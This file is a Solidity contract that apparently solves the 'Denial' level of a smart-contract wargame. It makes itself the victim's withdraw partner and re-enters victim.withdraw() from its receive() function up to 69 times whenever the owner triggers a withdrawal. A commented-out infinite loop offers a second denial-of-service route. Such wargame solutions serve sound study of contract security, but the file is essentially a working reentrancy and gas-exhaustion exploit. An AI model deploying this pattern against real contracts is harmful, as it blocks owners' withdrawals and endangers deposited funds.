// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./Denial.sol";

import "hardhat/console.sol";

contract Solution14 {
    Denial public victim;
    uint receiveStackDeep;

    constructor(Denial victim_) public {
        victim = victim_;
        victim.setWithdrawPartner(address(this));
    }

    receive() external payable {
        //while (true) {}

        //console.log("hello");
        //console.log(address(victim).balance);

        receiveStackDeep += 1;
        if (tx.origin == victim.owner() && receiveStackDeep < 69 ) {
            victim.withdraw();
        } else {
            receiveStackDeep = 0;
        }
        //uint balance = victim.withdrawPartnerBalances(address(this));
        //console.log(balance);
    }
}
